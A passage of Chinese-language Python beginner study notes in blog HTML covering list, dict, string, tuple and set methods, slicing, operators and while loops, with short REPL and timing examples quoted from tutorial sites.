若需要实现从大到小，需要添加关键字参数 reverse=True 列表名.sort (reverse=True)<br />\n⑦sorted ()：临时排序 sorted (列表名)</p>\n<p>⑧reverse ()：翻转 列表名.reverse ()</p>\n<p>⑨extend ()：列表的扩展 / 列表的拼接 列表名.extend (列表)</p>\n<p>⑩index (值)：获取列表中指定元素的下标 列表名.index (值)</p>\n<h4 id=\"字典dict\"><a class=\"anchor\" href=\"#字典dict\">#</a> 字典 (dict)</h4>\n<p>字典的系列函数：</p>\n<p>①dict (): 映射到另一个字典：字典名 = dict (字典名)<br />\n 通过序列创建字典：字典名 = dict (序列) #序列位置只能传入序列，因字典数据格式是键值对 ，所以序列中的每一个元素中应该包含两个值 eg. [(1,2),3,4]</p>\n<p>②fromkeys (): 多个 key 共用一个值 dict.fromkeys (key 的序列，值)</p>\n<p>③keys ()：获取字典中所有的 key，以形式列表返回 字典名.keys ()</p>\n<p>④values ()：获取字典中所有的 value，以实行列表返回 字典名.values ()</p>\n<p>⑤get (key, default)：根据 key，获取指定的 value 字典名.get (key, 提示信息)</p>\n<p>⑥pop (key，default)：根据 key，删除这个 key 的键值对 字典名.pop (key, 提示信息)</p>\n<p>⑦clear ()：清空字典中所有的键值对，只保留空字典 字典名.clear ()</p>\n<p>⑧del：删除字典 del 字典名</p>\n<p>⑨update ()：字典的更新 / 字典的拼接 字典名.update (字典名)</p>\n<p>字典新增数据：字典名 [key] = value<br />\n（key 存在，修改字典中 key 原有的 value key 不存在，在字典中新增一个键值对）</p>\n<h3 id=\"不可变数据类型\"><a class=\"anchor\" href=\"#不可变数据类型\">#</a> 不可变数据类型</h3>\n<p>不可变数据类型的函数都不会改变数据的值，所以需要添加一个值来接受</p>\n<h4 id=\"数字\"><a class=\"anchor\" href=\"#数字\">#</a> 数字</h4>\n<pre><code>整型：int\n浮点型：float\nbool:True、False\n复数：complex\n</code></pre>\n<h4 id=\"字符串\"><a class=\"anchor\" href=\"#字符串\">#</a> 字符串</h4>\n<p>字符串系列函数：</p>\n<p>①replace ()：替换字符串中的内容为新的字符串内容 字符串.replace (旧字符，新字符，替换次数) #替换次数默认为全部替换<br />\n②upper ()：字符串中所有的字符全部转换为大写<br />\n③lower (): 字符串中所有的字符串全部转换为小写<br />\n④len ()：求字符串的长度 len (字符串)<br />\n⑤split (切割字符)：将字符串按照自定的字符进行切割，返回一个列表<br />\n eg. a = ‘abcde’ b = a.split (‘c’) (结果) b=[‘ab’,’def’]<br />\n⑥capitalize ()：大写字符串的第一个字符<br />\n⑦title ()：大写字符串中每一个单词的首字母<br />\n⑧index ()：返回字符串中指定元素的下标，如果有重复的元素，返回第一个元素的下标</p>\n<h4 id=\"元组\"><a class=\"anchor\" href=\"#元组\">#</a> 元组</h4>\n<p>符号：()<br />\n 关键字：tuple<br />\n 创建 只有一个值的元组的时候，要在元素后面加一个逗号：元组名 = （1，）<br />\n元组函数：<br />\n①tuple ()：创建元素，实现其他数据类型转换为元组<br />\n②count ()：统计元组中指定元素出现的次数<br />\n③index ()：求出元组内指定元素的下标</p>\n<h4 id=\"集合\"><a class=\"anchor\" href=\"#集合\">#</a> 集合</h4>\n<p>符号：{}<br />\n 关键字：set<br />\n 创建空集合时用小括号：set ()<br />\n 特点：无需不重复<br />\n举例：<br />\nset1 = {1,2,3}<br />\n 或 set2 = set (‘hello’)<br />\n set2 的输出结果：{‘o’,‘e’，‘h’，‘l} #此结果不唯一，满足无需不重复特点即可</p>\n<h3 id=\"元组与列表的区别\"><a class=\"anchor\" href=\"#元组与列表的区别\">#</a> 元组与列表的区别</h3>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzQzNjMuaHRtbA==\"> http://c.biancheng.net/view/4363.html</span></p>\n<p>考试只要知道列表中的元素可以修改，元组中的元素不可以修改就行了</p>\n<p>元组和列表同属序列类型，且都可以按照特定顺序存放一组数据，数据类型不受限制，只要是 Python 支持的数据类型就可以。那么，元组和列表有哪些区别呢？</p>\n<p>元组和列表最大的区别就是，列表中的元素可以进行任意修改，就好比是用铅笔在纸上写的字，写错了还可以擦除重写；而元组中的元素无法修改，除非将元组整体替换掉，就好比是用圆珠笔写的字，写了就擦不掉了，除非换一张纸。<br />\n可以理解为，tuple 元组是一个只读版本的 list 列表。</p>\n<p>需要注意的是，这样的差异势必会影响两者的存储方式，我们来直接看下面的例子：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> listdemo <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> listdemo<span class=\"token punctuation\">.</span>__sizeof__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">40</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tupleDemo <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tupleDemo<span class=\"token punctuation\">.</span>__sizeof__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">24</span></pre></td></tr></table></figure><p>可以看到，对于列表和元组来说，虽然它们都是空的，但元组却比列表少占用 16 个字节，这是为什么呢？</p>\n<p>事实上，就是由于列表是动态的，它需要存储指针来指向对应的元素（占用 8 个字节）。另外，由于列表中元素可变，所以需要额外存储已经分配的长度大小（占用 8 个字节）。但是对于元组，情况就不同了，元组长度大小固定，且存储元素不可变，所以存储空间也是固定的。</p>\n<p>读者可能会问题，既然列表这么强大，还要元组这种序列类型干什么？</p>\n<p>通过对比列表和元组存储方式的差异，我们可以引申出这样的结论，即元组要比列表更加轻量级，所以从总体上来说，元组的性能速度要由于列表。</p>\n<p>另外，Python 会在后台，对静态数据做一些资源缓存。通常来说，因为垃圾回收机制的存在，如果一些变量不被使用了，Python 就会回收它们所占用的内存，返还给操作系统，以便其他变量或其他应用使用。</p>\n<p>但是对于一些静态变量（比如元组），如果它不被使用并且占用空间不大时，Python 会暂时缓存这部分内存。这样的话，当下次再创建同样大小的元组时，Python 就可以不用再向操作系统发出请求去寻找内存，而是可以直接分配之前缓存的内存空间，这样就能大大加快程序的运行速度。</p>\n<p>下面的例子，是计算初始化一个相同元素的列表和元组分别所需的时间。我们可以看到，元组的初始化速度要比列表快 5 倍。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>C<span class=\"token punctuation\">:</span>\\Users\\mengma<span class=\"token operator\">></span>python <span class=\"token operator\">-</span>m timeit <span class=\"token string\">'x=(1,2,3,4,5,6)'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">20000000</span> loops<span class=\"token punctuation\">,</span> best of <span class=\"token number\">5</span><span class=\"token punctuation\">:</span> <span class=\"token number\">9.97</span> nsec per loop</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>C<span class=\"token punctuation\">:</span>\\Users\\mengma<span class=\"token operator\">></span>python <span class=\"token operator\">-</span>m timeit <span class=\"token string\">'x=[1,2,3,4,5,6]'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">5000000</span> loops<span class=\"token punctuation\">,</span> best of <span class=\"token number\">5</span><span class=\"token punctuation\">:</span> <span class=\"token number\">50.1</span> nsec per loop</pre></td></tr></table></figure><p>当然，如果你想要增加、删减或者改变元素，那么列表显然更优。因为对于元组来说，必须得通过新建一个元组来完成。</p>\n<p>总的来说，元组确实没有列表那么多功能，但是元组依旧是很重要的序列类型之一，元组的不可替代性体现在以下这些场景中：</p>\n<p>元组作为很多内置函数和序列类型方法的返回值存在，也就是说，在使用某些函数或者方法时，它的返回值会元组类型，因此你必须对元组进行处理。<br />\n元组比列表的访问和处理速度更快，因此，当需要对指定元素进行访问，且不涉及修改元素的操作时，建议使用元组。<br />\n元组可以在映射（和集合的成员）中当做 “键” 使用，而列表不行。这会在后续章节中作详解介绍。</p>\n<h3 id=\"列表用和append区别\"><a class=\"anchor\" href=\"#列表用和append区别\">#</a> 列表用‘+’和‘append’区别</h3>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzI5NTc4L2FydGljbGUvZGV0YWlscy8xMDQ5Njg5MjI=\"> https://blog.csdn.net/qq_44729578/article/details/104968922</span></p>\n<p>本质分析<br />\n本质是否相同<br />\n代码分析：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>t<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>t1<span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>t2<span class=\"token operator\">=</span>t<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">##### 输出结果</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>结论：使用 append () 添加后，是在列表原列表 t 中添加，而不是 t1<br />\n 而使用 + 添加后，是在列表 t2 中添加，相当于在 t 中添加的结果重新放到了一个新的列表中，而原列表不变</p>\n<p>速度是否相同<br />\n代码分析：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>start1<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>t1<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    t1<span class=\"token operator\">=</span>t1<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>end1<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"运行了%s秒\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>end1<span class=\"token operator\">-</span>start1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>start2<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>t2<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    t2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>end2<span class=\"token operator\">=</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"运行了%s秒\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>end2<span class=\"token operator\">-</span>start2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">##### 输出结果</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>运行了<span class=\"token number\">0.15612554550170898</span>秒</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>运行了<span class=\"token number\">0.0029811859130859375</span>秒</pre></td></tr></table></figure><p>结论：append（）的添加速度比 + 快</p>\n<h2 id=\"切片\"><a class=\"anchor\" href=\"#切片\">#</a> 切片</h2>\n<ol>\n<li>\n<p>特点<br />\n只能用于序列 (可以用下标获取元素的)：字符串，列表，元组<br />\n特点：起始下标不能比截止下标大</p>\n</li>\n<li>\n<p>用法<br />\n序列名 [起始下标：截止下标]<br />\n 特例：<br />\n①序列名 [:]: 截取序列中全部内容<br />\n②序列名 [起始下标：]：截取从起始下标开始的全部内容<br />\n③序列名 [: 截止下标]：截取从 0 开始到截止下标前一位的所有内容<br />\n④序列名 [: 负数]：截取倒数除了负数个数的全部内容<br />\n eg.list [:-3]: 截取 0 到倒数第四个的全部内容 (倒数第三个不用)</p>\n</li>\n<li>\n<p>列表的复制<br />\n①列表 1 = 列表 2：<br />\n列表 1 和列表 2 共用同一块内存地址，修改其中任意一个列表的值，另一个列表也会更改内容<br />\n②列表 1 = 列表 2 [:]</p>\n</li>\n</ol>\n<h2 id=\"运算符和表达式\"><a class=\"anchor\" href=\"#运算符和表达式\">#</a> 运算符和表达式</h2>\n<ol>\n<li>算数运算符</li>\n</ol>\n<p>‘+’‘-’‘*’‘/’‘%’‘//’(整除，求商)‘<strong>’(求幂，2 的三次方：2</strong>3)</p>\n<ol start=\"2\">\n<li>赋值运算符</li>\n</ol>\n<p>‘=’‘+=’‘-=’‘*=’‘/=’</p>\n<ol start=\"3\">\n<li>关系运算符 (返回一个 bool 值)</li>\n</ol>\n<p>‘&gt;’‘&lt;’‘==’‘&gt;=’‘&lt;=’‘!=’</p>\n<ol start=\"4\">\n<li>逻辑运算符</li>\n</ol>\n<p>‘and’‘or’‘not’<br />\n详解</p>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hb3h1ZXh1ZS9hcnRpY2xlL2RldGFpbHMvMTA1ODk5NTEy\"> https://blog.csdn.net/maoxuexue/article/details/105899512</span></p>\n<p>and<br />\n 格式：操作数 1 and 操作数 2<br />\n 如果操作数 1 的值为 True (无论是什么类型 True、1、-1、’ '), 那么运算结果就等于操作数 2。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> <span class=\"token string\">'hello'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'hello'</span></pre></td></tr></table></figure><p>如果操作数 1 的值为 False (无论是什么类型 False、0、[]、’’), 那么运算结果就等于操作数 1。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>In <span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">and</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Out<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>or（跟 and 相反）<br />\n格式：操作数 1 or 操作数 2<br />\n 如果操作数 1 的值为 True (无论是什么类型 True 1 -1 ‘hello’)，那么运算结果就等于操作数 1。<br />\n如果操作数 1 的值为 False (无论是什么类型 False 0 [] ‘’)，那么运算结果就等于操作数 2。</p>\n<p>逻辑 and/or 的短路原则<br />\n举例的话，就是 “表达式 1 and 表达式 2“，假如表达式 1 的值为 true，则会继续执行表达式 2，最终整个表达式的值也就取决于表达式 2 的值；假如表达式 1 的值为 false，则会短路，不再执行表达式 2，直接取表达式 1 的值，也就是 false。<br />\nand 换成 or 刚好反过来，假如表达式 1 的值为 true，则会短路，不再执行表达式 2，直接取表达式 1 的值，也就是 true；假如表达式 1 的值为 false，则会继续执行表达式 2，最终整个表达式的值也就取决于表达式 2 的值。</p>\n<ol start=\"5\">\n<li>三元运算符</li>\n</ol>\n<p>语法：操作 1 if 操作数 2 else 操作 3<br />\n 操作数 2 为真时，执行操作 1；操作数 2 为假时，执行操作 3</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token keyword\">if</span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token keyword\">if</span> <span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>成员运算符</li>\n</ol>\n<p>‘in’‘not in’</p>\n<ol start=\"7\">\n<li>身份运算符</li>\n</ol>\n<p>‘is’‘is not’</p>\n<ol start=\"8\">\n<li>命令</li>\n</ol>\n<p>a. 循环语句：for /while 语句<br />\n b. 判断语句：if /if elif 语句<br />\n c. 顺序语句</p>\n<h2 id=\"条件判断和循环\"><a class=\"anchor\" href=\"#条件判断和循环\">#</a> 条件判断和循环</h2>\n<h3 id=\"条件判断\"><a class=\"anchor\" href=\"#条件判断\">#</a> 条件判断</h3>\n<p>计算机之所以能做很多自动化的任务，因为它可以自己做条件判断。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token operator\">&lt;</span>条件判断<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">1</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">elif</span> <span class=\"token operator\">&lt;</span>条件判断<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">2</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">elif</span> <span class=\"token operator\">&lt;</span>条件判断<span class=\"token number\">3</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">3</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token operator\">&lt;</span>执行<span class=\"token number\">4</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#---------------------------------------------#</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#if 判断条件还可以简写，比如写：</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> x<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'True'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 只要 x 是非零数值、非空字符串、非空 list 等，就判断为 True，否则为 False。</span></pre></td></tr></table></figure><p><em><strong>注意不要忘记冒号:</strong></em></p>\n<h3 id=\"循环\"><a class=\"anchor\" href=\"#循环\">#</a> 循环</h3>\n<p>为了让计算机能计算成千上万次的重复运算，我们就需要循环语句。</p>\n<h4 id=\"while-循环\"><a class=\"anchor\" href=\"#while-循环\">#</a> while 循环</h4>\n<p>Python 中 while 语句的一般形式：</p>\n<pre><code>while 判断条件(condition)：\n    执行语句(statements)……\n</code></pre>\n<p>菜鸟教程执行流程图<img data-src=\"image002.jpg\" alt=\"\" /><br />\n菜鸟教程的 GIF 图片<img data-src=\"image001.gif\" alt=\"\" /></p>\n<p><em><strong>同样需要注意冒号和缩进。另外，在 Python 中没有 do..while 循环。</strong></em></p>\n<p><strong>while 循环使用 else 语句</strong><br />\n在 while … else 在条件语句为 false 时执行 else 的语句块。</p>\n<p>语法格式如下：</p>\n<pre><code>while &lt;expr&gt;:\n    &lt;statement(s)&gt;\nelse:\n    &lt;additional_statement(s)&gt;\n</code></pre>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#循环输出数字，并判断大小：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>count <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span> count <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>count<span class=\"token punctuation\">,</span> <span class=\"token string\">\" 小于 5\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   count <span class=\"token operator\">=</span> count <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>count<span class=\"token punctuation\">,</span> <span class=\"token string\">\" 大于或等于 5\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">## 输出结果</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">0</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">1</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">2</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">3</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">4</span>  小于 <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">5</span>  大于或等于 <span class=\"token number\">5</span></pre></td></tr></table></figure><h4 id=\"for-语句\"><a class=\"anchor\" 